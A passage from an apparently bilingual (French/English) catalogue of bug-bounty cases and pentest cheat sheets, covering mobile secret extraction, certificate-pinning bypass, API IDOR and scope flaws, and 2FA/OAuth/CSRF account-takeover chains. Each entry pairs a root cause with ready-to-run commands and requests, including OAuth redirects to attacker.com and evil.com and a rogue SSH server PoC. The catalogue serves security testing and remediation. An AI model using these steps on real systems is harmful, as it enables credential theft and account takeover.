Les développeurs Android intègrent parfois des clés API tierces (Stripe, AWS, Firebase, Google Maps) ou des secrets internes directement dans le code Java/Kotlin compilé, dans BuildConfig, strings.xml ou des fichiers de configuration embarqués. Comme le code Java/Kotlin (via dex2jar/jadx) et les ressources (via apktool) sont trivialement reconstructibles depuis l'APK, ces secrets sont récupérables par quiconque télécharge l'application. L'impact dépend du scope de la clé : accès direct à des buckets S3, facturation Stripe détournée, ou pivot vers l'infrastructure backend.

**Cause racine :** Des secrets destinés à un usage serveur sont embarqués dans un binaire client distribué publiquement, sans se reposer sur un backend proxy pour les opérations sensibles.

**Preuve technique (verbatim depuis la source) :**

```
Décompilation complète de l'APK :
apktool d target.apk -o target_decoded
jadx -d target_jadx target.apk

Recherche de secrets par motifs connus :
grep -rE "(api[_-]?key|secret|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24,})" target_jadx/sources/ target_decoded/res/values/strings.xml

# Résultat trouvé dans com/target/app/BuildConfig.java :
# public static final String STRIPE_SECRET_KEY = "sk_live_51Hh3kKJ9x...";
# public static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";

Validation de la clé AWS extraite :
aws sts get-caller-identity --profile leaked \
  --aws-access-key-id AKIAIOSFODNN7EXAMPLE --aws-secret-access-key <secret_extrait>
# -> retourne l'identité IAM, confirmant que la clé est active et exploitable.
```

**Techniques :** apk-decompilation, static-analysis, hardcoded-credentials

---

### Extraction de données sensibles stockées en clair (SharedPreferences/SQLite) via adb

**🧾 Cheatsheet**
sévérité : high · CWE-312

Certaines applications Android stockent des tokens de session, mots de passe ou données personnelles en clair dans les SharedPreferences XML ou dans une base SQLite locale sans chiffrement (EncryptedSharedPreferences/SQLCipher). Sur un appareil de test avec l'app en mode debuggable ou via un accès root, ces fichiers sont directement lisibles via adb run-as ou adb pull. Un attaquant avec accès physique temporaire, ou via un malware sur le même appareil, peut ainsi exfiltrer les identifiants de session et usurper le compte.

**Cause racine :** Les données sensibles sont persistées sur le stockage local de l'application sans chiffrement au repos, en s'appuyant uniquement sur le sandboxing Android comme unique protection.

**Preuve technique (verbatim depuis la source) :**

```
Lecture directe des SharedPreferences via adb (app avec android:debuggable=true ou device rooté) :
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml"

# Résultat :
# <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
# <map>
#   <string name="auth_token">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoxMjN9.xxxx</string>
#   <string name="user_password_cache">MyP@ssw0rd123</string>
# </map>

Extraction de la base SQLite locale :
adb shell "run-as com.target.app sqlite3 /data/data/com.target.app/databases/app.db 'select username, password from users;'"
# -> alice | S3cretPass!  (colonne password stockée en clair, pas de hash)

Réutilisation du token extrait sur l'API :
curl -s https://api.target.com/api/v1/me -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9..."
# -> 200 OK, session détournée avec succès.
```

**Techniques :** adb-extraction, insecure-storage, sqlite-analysis

---

### Extraction du Keychain iOS et analyse binaire sur appareil jailbreaké (class-dump/Hopper)

**🧾 Cheatsheet**
sévérité : high · CWE-522

Sur un appareil iOS jailbreaké, les protections normales du Secure Enclave et du sandboxing applicatif peuvent être contournées, permettant de dumper l'intégralité du Keychain (tokens, refresh tokens, mots de passe) indépendamment de leur classe de protection déclarée si celle-ci est trop permissive (kSecAttrAccessibleAlways). En parallèle, class-dump et Hopper Disassembler permettent de reconstruire les en-têtes Objective-C et d'analyser le binaire Mach-O pour retrouver des clés de chiffrement codées en dur utilisées pour "protéger" ces données avant stockage, révélant que le chiffrement applicatif est cassable en White-box.

**Cause racine :** Utilisation d'une classe d'accessibilité Keychain trop permissive et présence de clés de chiffrement statiques embarquées dans le binaire client au lieu de dériver les clés depuis le Secure Enclave.

**Preuve technique (verbatim depuis la source) :**

```
Dump complet du Keychain via SSH sur device jailbreaké (Keychain-dumper de ptoomey3) :
ssh root@<ip_device>
./keychain_dumper -e > keychain_dump.plist

# Extrait du dump :
# Generic Password
# Service: com.target.app.auth
# Account: refresh_token
# Data: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
# Accessible: kSecAttrAccessibleAlways   <- exploitable même appareil verrouillé

Extraction des en-têtes de classes Objective-C avec class-dump :
class-dump -H /var/containers/Bundle/Application/<UUID>/App.app/App -o headers/
grep -r "encryptionKey\|AESKey\|password\|apiToken" headers/*.h

# headers/CryptoHelper.h révèle :
# + (NSString *)staticAESKey;   // implémentation renvoie une clé hex codée en dur

Désassemblage complémentaire avec Hopper pour confirmer la valeur de la clé statique
dans le segment __TEXT du binaire Mach-O, permettant de déchiffrer offline tout token
intercepté lors d'un backup iTunes non chiffré.
```

**Techniques :** jailbreak-extraction, keychain-dump, class-dump, binary-analysis

---

### Contournement du certificate pinning mobile via Frida/Objection pour intercepter le trafic API

**🧾 Cheatsheet**
sévérité : high · CWE-295

Le certificate pinning est censé empêcher l'interception du trafic HTTPS même via un proxy MITM avec certificat installé côté device. En instrumentant l'application à l'exécution avec Frida (hooking des fonctions natives OkHttp/TrustManager sur Android ou NSURLSession/SecTrust sur iOS) ou via le wrapper Objection, un pentester désactive dynamiquement les vérifications de pinning sans recompiler l'application. Cela permet d'intercepter et modifier en clair le trafic API dans Burp/mitmproxy, révélant souvent des clés API, une logique métier ou des failles d'autorisation invisibles côté client.

**Cause racine :** La protection contre l'interception repose uniquement sur une vérification côté client (code exécuté sur un appareil non fiable), qui peut être patchée en mémoire à l'exécution.

**Preuve technique (verbatim depuis la source) :**

```
Bypass via Objection (attache au process en cours) :
frida-ps -Uai   # lister les apps installées et process actifs
objection -g com.target.app explore --startup-command "android sslpinning disable"

Bypass via script Frida universel :
adb reverse tcp:8080 tcp:8080
frida -U -f com.target.app -l frida-multiple-unpinning.js --no-pause

Configuration du proxy Burp sur l'appareil (port 8080) puis capture :
GET /api/v2/wallet/balance HTTP/1.1
Host: api.target.com
X-Api-Key: ak_mobile_7f3e9c2b1a
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

# Le trafic normalement bloqué par le pinning apparaît en clair dans Burp,
# révélant une clé X-Api-Key statique partagée par toutes les installations de l'app,
# réutilisable indépendamment du device d'origine.
```

**Techniques :** frida, objection, ssl-pinning-bypass, mitm

---

### Faille de versioning API — endpoint v1 obsolète encore actif sans les correctifs de sécurité de v2

**🧾 Cheatsheet**
sévérité : high · CWE-937

Lorsqu'une équipe corrige une vulnérabilité (ex. contrôle d'ownership manquant, IDOR) uniquement dans la nouvelle version de l'API (v2) sans désactiver l'ancienne version (v1) en production, un attaquant peut simplement rejouer ses requêtes sur v1 pour retrouver le comportement vulnérable. Ces versions legacy sont souvent absentes de la documentation active, mais restent routées par le même backend ou une passerelle API qui ne les a jamais désactivées, offrant un contournement trivial des correctifs récents.

**Cause racine :** Absence de dépréciation effective (sunset) des anciennes versions d'API : les correctifs de sécurité sont appliqués sur la nouvelle route sans désactiver ni corriger l'ancienne, qui reste accessible.

**Preuve technique (verbatim depuis la source) :**

```
Vérification du contrôle d'accès sur la version courante corrigée :
curl -i https://api.target.com/api/v2/users/123 -H "Authorization: Bearer <token_user_456>"
# -> HTTP/1.1 403 Forbidden (ownership check ajouté en v2)

Rejeu de la même requête logique sur l'ancienne version toujours active :
curl -i https://api.target.com/api/v1/users/123 -H "Authorization: Bearer <token_user_456>"
# -> HTTP/1.1 200 OK
# {"id":123,"email":"victim@target.com","phone":"+33612345678",...}
# -> IDOR intégral car v1 ne vérifie pas que le token appartient bien à l'utilisateur 123.

Confirmation de l'existence de v1 via la documentation Swagger encore exposée :
curl -s https://api.target.com/api/v1/swagger.json | jq '.info.version'
# "1.0.0" -- toujours servi alors que la doc publique ne référence que /api/v2/
```

**Techniques :** api-version-discovery, deprecated-endpoint-abuse

**Correspond aux classes qualifiantes :** auth-bypass, idor

**Signal (endpoints/fonctions observés) :**
- `/api/v1/*`

---

### Excessive Data Exposure — l'API renvoie l'objet complet au lieu des champs filtrés (OWASP API3:2019)

**🧾 Cheatsheet**
sévérité : medium · CWE-213

De nombreuses API sérialisent l'objet modèle complet retourné par l'ORM (ex. model.toJSON()) au lieu d'appliquer un DTO ou un allowlist de champs, en se reposant sur le frontend pour filtrer visuellement les données sensibles. En inspectant la réponse brute JSON (plutôt que l'affichage rendu dans l'app), un attaquant récupère des champs internes comme le hash de mot de passe, le numéro de sécurité sociale ou des scores de risque internes qui ne devraient jamais quitter le backend.

**Cause racine :** Le sérialiseur backend renvoie l'intégralité du modèle de données interne sans allowlist explicite de champs exposables, en confiant le filtrage à l'affichage côté client.

**Preuve technique (verbatim depuis la source) :**

```
Requête sur l'endpoint profil utilisateur, inspection brute (hors rendu UI) :
curl -s https://api.target.com/api/v1/users/me -H "Authorization: Bearer $TOKEN" | jq .

# Réponse complète observée :
# {
#   "id": 42,
#   "email": "user@target.com",
#   "passwordHash": "$2b$10$KixQ2n9z8v...",
#   "ssn": "078-05-1120",
#   "internalRiskScore": 87,
#   "isFraudSuspect": false,
#   "stripeCustomerId": "cus_Nx83jd92"
# }

# Le frontend n'affiche que email et nom, mais passwordHash, ssn et
# internalRiskScore sont présents dans le JSON brut et exploitables
# par toute application tierce ou script consommant l'API directement.
```

**Techniques :** excessive-data-exposure, response-inspection

**Signal (endpoints/fonctions observés) :**
- `/api/*/users/me`
- `/api/*/profile`

---

### Confusion de scope de clé API — une clé d'analytics en lecture seule autorise des mutations GraphQL

**🧾 Cheatsheet**
sévérité : high · CWE-863

Certaines architectures API délivrent des clés avec un scope déclaré côté dashboard (ex. "analytics:read") mais la passerelle ne vérifie en réalité que la validité/existence de la clé, pas le scope réel, avant de router la requête vers le resolver GraphQL ou REST correspondant. Une clé destinée uniquement à la lecture de métriques, trouvée par exemple dans le bundle JS d'une app mobile ou d'un widget tiers, peut alors être réutilisée pour exécuter des mutations d'écriture arbitraires, sortant totalement de son périmètre annoncé.

**Cause racine :** Le contrôle d'autorisation vérifie l'authenticité de la clé API mais pas la correspondance entre son scope déclaré et l'opération GraphQL/REST demandée.

**Preuve technique (verbatim depuis la source) :**

```
Clé API en lecture seule extraite du bundle JS d'un widget embarqué :
X-Api-Key: ak_live_readonly_9f3d7c2e1b

Appel d'une mutation d'écriture avec cette clé censée être read-only :
curl -i -X POST https://api.target.com/graphql \
  -H "X-Api-Key: ak_live_readonly_9f3d7c2e1b" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUserEmail(id: 42, email: \\"pwned@evil.com\\") { id email } }"}'

# Réponse : HTTP/1.1 200 OK
# {"data":{"updateUserEmail":{"id":42,"email":"pwned@evil.com"}}}

# La mutation s'exécute alors que le dashboard des clés API affiche pourtant
# ce token avec le scope "analytics:read" uniquement -> confusion de scope confirmée.
```

**Techniques :** api-key-scope-bypass, graphql-mutation-abuse

**Correspond aux classes qualifiantes :** bola, bfla, graphql

**Signal (endpoints/fonctions observés) :**
- `/graphql`

**Paramètres impliqués :** `X-Api-Key`

---

### Détournement de deep link / custom URL scheme menant à une prise de contrôle de compte

**🧾 Cheatsheet**
sévérité : high · CWE-940

Une application mobile qui enregistre un schéma d'URL personnalisé (ex. myapp://reset-password?token=...) sans vérifier l'origine de l'appelant (Android intent-filter exporté sans android:autoVerify, ou schéma iOS sans Universal Links) peut être déclenchée par n'importe quel lien externe, page web ou application malveillante. Android autorisant plusieurs applications à revendiquer le même schéma personnalisé ("scheme squatting"), un attaquant peut intercepter un callback OAuth ou un lien de réinitialisation de mot de passe destiné à l'app légitime, volant le code d'autorisation ou forçant une action sensible, ce qui conduit à une prise de contrôle de compte.

**Cause racine :** L'application fait confiance à tout appelant du deep link sans valider l'origine (package signant, App Links/Universal Links vérifiés) ni la provenance légitime des paramètres sensibles transmis.

**Preuve technique (verbatim depuis la source) :**

```
Déclenchement du deep link de réinitialisation depuis un contexte non fiable (page web/app malveillante) :
<a href="myapp://reset-password?token=ATTACKER_CONTROLLED&email=victim@target.com">Cliquez ici</a>

Reproduction via adb sur un appareil de test pour simuler l'interception d'un callback OAuth :
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://oauth/callback?code=STOLEN_CODE&state=xyz"

# L'AndroidManifest.xml de la cible montre l'intent-filter vulnérable :
# <intent-filter android:autoVerify="false">
#   <action android:name="android.intent.action.VIEW" />
#   <category android:name="android.intent.category.BROWSABLE" />
#   <data android:scheme="myapp" android:host="oauth" />
# </intent-filter>

# Sans autoVerify/App Links, une app tierce installée peut déclarer le même
# scheme "myapp" et intercepter code=STOLEN_CODE avant l'app légitime,
# permettant l'échange du code OAuth contre un token de session -> ATO.
```

**Techniques :** deep-link-hijacking, intent-hijacking, custom-url-scheme-abuse

**Correspond aux classes qualifiantes :** account-takeover, open-redirect

**Paramètres impliqués :** `token`, `code`, `email`

---

### Improper Inventory Management — endpoint API zombie retrouvé par diff de bundles JS et web.archive.org

**🧾 Cheatsheet**
sévérité : high

Les applications web redéploient régulièrement de nouveaux bundles JavaScript, mais les anciennes versions archivées (via Wayback Machine ou des captures locales) contiennent parfois des références à des endpoints internes retirés de l'UI actuelle mais jamais désactivés côté serveur. En diffant un bundle JS archivé sur web.archive.org avec la version courante, un attaquant retrouve ces routes "zombies" (ex. /api/internal/legacy/export-users) qui échappent souvent aux règles WAF et de rate-limiting ajoutées uniquement pour les patterns d'URL actuels, illustrant un défaut de gestion d'inventaire des API (OWASP API9).

**Cause racine :** Absence d'inventaire à jour des endpoints API exposés : des routes legacy retirées de l'interface restent actives côté backend et hors du périmètre des contrôles de sécurité appliqués aux routes courantes.

**Preuve technique (verbatim depuis la source) :**

```
Récupération d'un bundle JS archivé et diff avec la version actuelle :
wayback_machine_downloader https://app.target.com

diff <(curl -s "https://web.archive.org/web/20220101000000/https://app.target.com/static/js/main.old.js" \
        | grep -oE '"/api/[a-zA-Z0-9_/-]+"' | sort -u) \
     <(curl -s https://app.target.com/static/js/main.current.js \
        | grep -oE '"/api/[a-zA-Z0-9_/-]+"' | sort -u)

# Ligne supprimée uniquement présente dans l'ancien bundle :
# < "/api/internal/legacy/export-users"

Vérification que la route zombie est toujours active en production :
curl -i https://api.target.com/api/internal/legacy/export-users -H "Authorization: Bearer $TOKEN"
# -> HTTP/1.1 200 OK, export CSV complet de la table users
# -> aucune règle WAF déclenchée (les règles ne couvrent que /api/v2/*),
#    aucun rate-limit appliqué : contournement total des contrôles récents.
```

**Techniques :** shadow-api-discovery, js-bundle-diffing, wayback-machine-recon

**Correspond aux classes qualifiantes :** auth-bypass, idor

**Signal (endpoints/fonctions observés) :**
- `/api/internal/legacy/*`

---

## Auth Bypass — MFA / 2FA / OAuth / Clickjacking

*22 cas.*

### 2FA Bypass Despite Fix via Manual Injection of isVerifyAuth Cookie in Local Storage

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/2fa-bypass-despite-fix-via-manual-injection-of-isverifyauth-cookie-in-local-storage-cad7154e)

After a first 2FA bypass (removing the isVerifyAuth cookie from local storage) was patched, the backend was found to still trust that cookie whenever it IS present. By manually recreating the isVerifyAuth=true cookie via DevTools and navigating directly to the profile page, the attacker fully bypasses OTP verification and reaches the account with only username/password.

**Cause racine :** The fix only removed the client-side default value of the cookie without removing the backend's trust in that cookie when present.

**Preuve technique (verbatim depuis la source) :**

```
Exploitation steps:
1. Log in with valid email+password -> redirected to example.com/customer/verify-otp
2. DevTools -> Application -> Local Storage -> manually create: isVerifyAuth = true
3. Navigate directly to example.com/customer/profile
4. Full access granted, OTP step never happens.
The 'fix' only stopped the app from setting isVerifyAuth=false by default in local storage; it never removed the backend's trust in the cookie WHEN present, so an attacker just recreates it client-side.
```

**Techniques :** cookie-manipulation, client-side-trust, local-storage-tampering, otp-bypass

**Correspond aux classes qualifiantes :** auth-bypass, account-takeover

**Signal (endpoints/fonctions observés) :**
- `example.com/customer/verify-otp`
- `example.com/customer/profile`

**Paramètres impliqués :** `isVerifyAuth`

---

### 2FA requirement bypass when inviting team members

**📄 Cas réel**
[source](https://hackerone.com/reports/3356149)

The application required 2FA to be enabled before inviting team members, but this control was only enforced client-side. Intercepting the response with Burp's Match and Replace and flipping a false flag to true let an attacker send invitations without ever enabling 2FA, bypassing the security policy.

**Cause racine :** The 2FA requirement for sending team invitations was checked only client-side, with no equivalent server-side validation.

**Preuve technique (verbatim depuis la source) :**

```
Repro: attempt team invite without 2FA enabled -> app blocks with a client-side flag (false). Use Burp 'Match and Replace' to rewrite that response flag false -> true on the fly, refresh, retry the invite -> succeeds, no 2FA ever enabled. The 2FA requirement for this action existed only as a client-checked boolean, never revalidated server-side.
```

**Techniques :** client-side-response-tampering, match-and-replace, server-side-validation-missing

**Correspond aux classes qualifiantes :** auth-bypass

---

### Clickjacking can lead to account takeover

**📄 Cas réel**
[source](https://hackerone.com/reports/2119892)

An endpoint (sketch.pixiv.net/draw) had no anti-framing protection, letting it be loaded in an invisible iframe overlaid on a decoy page (clickjacking, using a public GitHub PoC tool). A tricked victim could unknowingly enter their password, delete their account, or like/delete posts and comments, opening the door to account takeover.

**Cause racine :** Absence of anti-framing protection (X-Frame-Options / CSP frame-ancestors) on sensitive pages, allowing them to be embedded in an iframe for clickjacking.

**Preuve technique (verbatim depuis la source) :**

```
Target endpoint with no anti-framing header: https://sketch.pixiv.net/draw
PoC tool: https://github.com/shifa123/clickjackingpoc (generic invisible-iframe-over-decoy-page clickjacking harness)
Impact chain once framed: victim can be tricked into typing their password, clicking 'Delete my account', liking/deleting a post, or commenting -- any action a legit user can trigger by clicking, since the real page is invisibly overlaid on a decoy.
```

**Techniques :** clickjacking, iframe-overlay, ui-redress

**Correspond aux classes qualifiantes :** account-takeover

**Signal (endpoints/fonctions observés) :**
- `https://sketch.pixiv.net/draw`

---

### Open Redirect Flow Abuse via OAuth Validation Bypass

**📄 Cas réel**
sévérité : critical · [source](https://academy.logicalbreach.com/writeups/duplicate-open-redirect-flow-abuse-via-oauth-validation-bypass-32d63048)

The OAuth authorization endpoint validated the callback_url parameter using a simple startsWith() prefix test instead of strict URL parsing, allowing authority-confusion URLs (userinfo@, subdomain, concatenation, port) to pass validation while actually redirecting to an attacker domain. Confirmed via out-of-band 302 redirects to OOB domains (Interactsh/Burp Collaborator), with risk of OAuth code/token leakage if chained to an authenticated authorization request.

**Cause racine :** The OAuth redirect allowlist was checked with a string-prefix match (startsWith) instead of strict URL parsing and exact domain matching.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable check (pseudocode, prefix match instead of exact URL parsing):
validationCheck = redirect_uri.startsWith("https://app.trusted-domain.com")
// returns true for: https://app.trusted-domain.com@attacker.com/

Confirmed bypass variants (all accepted by the allowlist check):
1) Authority confusion (userinfo@):
GET https://auth.redacted-domain.com/oauth/v1/authorize?response_type=code&client_id=web-client-app&callback_url=https://app.trusted-domain.com@attacker.com/
-> HTTP/2 302 Found / Location: https://app.trusted-domain.com@attacker.com/?error=unauthorized_client...

2) Subdomain confusion:
...&callback_url=https://app.trusted-domain.com.evil.com/  -> 302 Location: https://app.trusted-domain.com.evil.com/

3) String concatenation:
...&callback_url=https://app.trusted-domain.comevil.com/  -> 302 Location: https://app.trusted-domain.comevil.com/

4) Port separation + authority confusion:
...&callback_url=https://app.trusted-domain.com:8443@evil.com/  -> 302 Location: https://app.trusted-domain.com:8443@evil.com/

5) OOB end-to-end proof (Interactsh/Burp Collaborator):
...&callback_url=https://app.trusted-domain.com.xyz123.oast.site/landing
-> HTTP/2 302 Found / Location: https://app.trusted-domain.com.xyz123.oast.site/landing?error=...
OOB listener logs:
[app.trusted-domain.com.xyz123] Received DNS interaction (A)
[app.trusted-domain.com.xyz123] Received HTTP interaction
GET /landing?error=... HTTP/2.0
Host: app.trusted-domain.com.xyz123.oast.site
```

**Techniques :** open-redirect, prefix-matching-bypass, authority-confusion, oob-verification

**Correspond aux classes qualifiantes :** open-redirect, oauth

**Signal (endpoints/fonctions observés) :**
- `https://auth.redacted-domain.com/oauth/v1/authorize?response_type=code&client_id=web-client-app&callback_url=https://app.trusted-domain.com@attacker.com/`
- `https://auth.redacted-domain.com/oauth/v1/authorize?...&callback_url=https://app.trusted-domain.com.xyz123.oast.site/landing`

**Paramètres impliqués :** `response_type`, `client_id`, `callback_url`

---

### MFA Bypass via Account Attribute Manipulation

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/mfa-bypass-via-account-attribute-manipulation-77cec1bd)

The /api/v1/user/profile endpoint let an authenticated user modify internal attributes that were never meant to be exposed, including require_mfa. Sending require_mfa=false through this endpoint with a token obtained right after standard authentication (before any MFA check) let an attacker disable MFA on their own account and log back in without ever being asked for a second factor.

**Cause racine :** No server-side restriction (field allowlist) on which attributes can be modified via the profile-update endpoint, allowing modification of an internal security attribute (mass assignment).

**Preuve technique (verbatim depuis la source) :**

```
Step 1 -- obtain a token via normal password auth, BEFORE any MFA check fires:
POST /api/v1/auth/token HTTP/1.1
Host: auth.redacted-target.com
Content-Type: application/x-www-form-urlencoded

grant_type=password&client_id=web-app&username=victim@example.com&password=Password123!
-> response contains access_token.

Step 2 -- use that token to flip a hidden internal attribute via the profile-update endpoint:
POST /api/v1/user/profile HTTP/1.1
Host: api.redacted-target.com
Authorization: Bearer <access_token>
Content-Type: application/json

{
  "username": "victim@example.com",
  "firstName": "Test",
  "lastName": "User",
  "email": "victim@example.com",
  "attributes": {
    "require_mfa": false,
    "locale": "en"
  }
}
-> HTTP/1.1 204 No Content

Step 3 -- log in again at https://portal.redacted-target.com/login -> MFA step is skipped entirely.
```

**Techniques :** mass-assignment, hidden-attribute-manipulation, server-side-restriction-missing

**Correspond aux classes qualifiantes :** mass-assignment, auth-bypass, account-takeover

**Signal (endpoints/fonctions observés) :**
- `/api/v1/user/profile`
- `/api/v1/auth/token`
- `https://portal.redacted-target.com/login`

**Paramètres impliqués :** `require_mfa`, `username`, `firstName`, `lastName`, `email`, `attributes`, `grant_type`, `client_id`, `password`

---

### One-Click Account Takeover via OTP Bypass and CSRF

**📄 Cas réel**
sévérité : critical · [source](https://academy.logicalbreach.com/writeups/en-one-click-account-takeover-via-otp-bypass-and-csrf-3bef190a-5d0e-4fdf-b4ed-6df234263916)

The email-change endpoint (userAction!modifyEmail.action) validated the OTP only against the target email, without checking session or the originating feature, and accepted this critical state change via a GET request with no anti-CSRF protection. An attacker could obtain a valid OTP for their own address through a neutral flow, then trick the victim (link or hidden image) into triggering their account's email change to the attacker's address, leading to full takeover via password reset. An earlier fix limiting the OTP's context was bypassed because the underlying CSRF/GET-method flaw had not been fixed.

**Cause racine :** The OTP code was bound only to the target email, not to the session/action, and the sensitive email-change action was executable via a GET request with no anti-CSRF token.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable endpoint (GET-based state change, OTP bound to email only, no CSRF token/Origin check):
https://api.example.com/user/userAction!modifyEmail.action?email=[NEW_EMAIL]&checkcode=[OTP]

Attack chain:
1. Attacker requests an OTP to their OWN address via a neutral flow (e.g. registration panel) -> receives valid code (e.g. 123456) for attacker@evil.com.
2. Attacker builds the CSRF URL:
https://api.example.com/user/userAction!modifyEmail.action?email=attacker@evil.com&checkcode=123456
3. Victim (authenticated, active session) is tricked into loading this URL (link or hidden <img> tag) -> browser auto-attaches victim's session cookies.
4. Server checks only that checkcode matches email (not session/context) -> victim's account email silently changed to attacker@evil.com.
5. Attacker requests 'Password Reset' to attacker@evil.com -> full account takeover.

Bypass of the FIRST patch (which scoped OTP codes to their originating feature): attacker logs into a SECOND account they control, organically requests an email-change to attacker@evil.com from THAT account (forcing the platform to issue an OTP with the correct 'Email Change' context/scope), then reuses that properly-scoped OTP in the same CSRF URL pattern against the real victim -- the GET-based CSRF hole itself was never fixed, only the OTP scoping was tightened.
```

**Techniques :** otp-reuse, csrf, get-based-state-change, business-logic-flaw

**Correspond aux classes qualifiantes :** csrf, account-takeover, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `https://api.example.com/user/userAction!modifyEmail.action?email=[NEW_EMAIL]&checkcode=[OTP]`

**Paramètres impliqués :** `email`, `checkcode`

---

### Unauthenticated OAuth Token Leading to Access to Protected APIs

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/unauthenticated-oauth-token-leading-to-access-to-protected-apis-73c58419-6878-4a66-ba35-74abdf94b67c)

Scanning the app's JavaScript files (JSEXPOSURES) revealed a publicly exposed OAuth client_id. The /oauth/token endpoint issued a valid Bearer access token given only this client_id, with no authentication, credentials, or user context. The resulting token granted access to APIs meant to be protected (e.g. /v1/partners/lookup), which additionally behaved as a credential-validation oracle (different responses depending on identifier existence).

**Cause racine :** The OAuth authorization server issued access tokens based solely on a publicly exposed client_id, without verifying the requester's identity.

**Preuve technique (verbatim depuis la source) :**

```
Step 1 -- extract client_id from a bundled JS file (found via the JSEXPOSURES tool, https://github.com/danielhidalgo2/JSEXPOSURES -- pattern matching + entropy analysis + contextual indicators over JS assets):
GET https://portal.hidalg0d.com/static/js/main.js
-> client_id = 70bf16f4-XXXX-XXXX-XXXX-XXXXXXXX

Step 2 -- request an OAuth token with ONLY the client_id, no credentials/cookies/user context:
curl https://api.hidalg0d.com/oauth/token -H "client_id: 70bf16f4-XXXX-XXXX-XXXX-XXXXXXXX" -H "Origin: https://portal.hidalg0d.com"
Response:
{"token_type":"Bearer","access_token":"REDACTED","expires_in":1800}

Step 3 -- use the token against a protected API:
curl https://api.hidalg0d.com/v1/partners/lookup -H "Authorization: Bearer REDACTED_TOKEN" -H "identifier: TEST_IDENTIFIER"
Response: {"status":"success","identifier":"TEST_IDENTIFIER"}

Bonus oracle behavior observed:
Valid identifier   -> {"status": "success"}
Invalid identifier -> {"status": "identifier not found"}
-- lets an attacker enumerate valid identifiers via the differing response.
```

**Techniques :** js-recon, secret-exposure, oauth-misconfiguration, identifier-enumeration

**Correspond aux classes qualifiantes :** oauth, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `https://portal.hidalg0d.com/static/js/main.js`
- `https://api.hidalg0d.com/oauth/token`
- `https://api.hidalg0d.com/v1/partners/lookup`

**Paramètres impliqués :** `client_id`, `Authorization`, `identifier`

---

### CVE-2026-12064: proto-default skips SSH verification

**📄 Cas réel**
[source](https://hackerone.com/reports/3797526)

When invoking curl with a schemeless URL and --proto-default sftp (or scp), the CLI layer wrongly guesses the URL is HTTP and therefore does not apply the SSH security options (host public key SHA256/knownhosts checks). The libcurl runtime nonetheless correctly applies --proto-default and connects via SFTP/SCP, so --hostpubsha256/--hostpubmd5/--knownhosts are silently ignored — a MITM running a fake SSH server can capture the victim's password while curl reports no host-key error.

**Cause racine :** url_proto_and_rewrite() uses scheme-guessing to decide whether to apply SSH verification options and guesses HTTP for a schemeless URL even when --proto-default sftp/scp is set, while the actual connection is made via SFTP without host-key verification configured.

**Preuve technique (verbatim depuis la source) :**

```
Root cause (src/config2setopts.c, url_proto_and_rewrite()):
// src/config2setopts.c:190
if(use_proto != proto_scp && use_proto != proto_sftp)
  return CURLE_OK;  // skips CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256 / CURLOPT_SSH_KNOWNHOSTS setup
// CURLU_GUESS_SCHEME guesses HTTP for a schemeless URL like host:2222/path -- SSH options never get wired up.
// CURLOPT_DEFAULT_PROTOCOL is applied LATER; lib/url.c:1662 prepends sftp:// at runtime -> real transfer IS sftp, but with zero host-key verification configured.

PoC (rogue Paramiko SSH server captures whatever password curl sends):
# Test 1 -- explicit sftp:// scheme + WRONG pin -> correctly rejects, no password sent:
$CURL_BIN --user victim:Secret123 --hostpubsha256 $WRONG_PIN sftp://127.0.0.1:$PORT/tmp/file
-> exit=60 "mismatch SHA256 fingerprint..."  creds captured: <none>

# Test 2 -- --proto-default sftp + SCHEMELESS URL + same WRONG pin -> BUG, password sent anyway:
$CURL_BIN --user victim:Secret123 --proto-default sftp --hostpubsha256 $WRONG_PIN 127.0.0.1:$PORT/tmp/file
-> exit=67 "Authentication failure"  creds captured: ['victim:Secret123']

RESULT: VULNERABLE -- --proto-default sftp silently bypassed the host-key pin the user explicitly requested, and the password crossed the trust boundary to an unverified rogue SSH server before the (now-meaningless) auth failure.
```

**Techniques :** scheme-guessing-bypass, mitm, host-key-verification-bypass, differential-testing

**Correspond aux classes qualifiantes :** auth-bypass

**Signal (endpoints/fonctions observés) :**
- `src/config2setopts.c`
- `url_proto_and_rewrite()`

**Paramètres impliqués :** `--proto-default`, `--hostpubsha256`, `--hostpubmd5`, `--knownhosts`, `CURLOPT_DEFAULT_PROTOCOL`

---

### CVE-2026-8458: wrong reuse for different services

**📄 Cas réel**
[source](https://hackerone.com/reports/3721183)

libcurl wrongly reuses an HTTP connection authenticated via Negotiate for a subsequent request to the same host, even when the service principal changes via CURLOPT_SERVICE_NAME/--service-name. The second request to a different service on an already-authenticated connection triggers neither a new Negotiate handshake nor a new Authorization header, and the server processes it under the first service's authentication context — an incomplete-fix variant of a prior CVE that hadn't covered service-principal changes.

**Cause racine :** The HTTP Negotiate connection-reuse logic does not treat the service principal name as part of the authenticated connection's identity, allowing reuse of a connection authenticated for one service to reach a different service on the same host.

**Preuve technique (verbatim depuis la source) :**

```
GSS interposer + keep-alive test server setup:
gcc -shared -fPIC -o /tmp/libpoc_gss_service_reuse.so /tmp/poc_gss_service_reuse.c -ldl
python3 /tmp/poc_negotiate_service_server.py

Vulnerable case (svcA authenticates, svcB on same host+connection is served WITHOUT any new handshake):
LD_PRELOAD=/tmp/libpoc_gss_service_reuse.so POC_GSS_CREDS=NTLM_Alice \
/tmp/curl-8.20.0/src/curl -sv --noproxy '*' \
  --negotiate --service-name svcA http://127.0.0.1:18080/svcA \
  --next \
  --negotiate --service-name svcB http://127.0.0.1:18080/svcB

Observed:
* Reusing existing http: connection with host 127.0.0.1
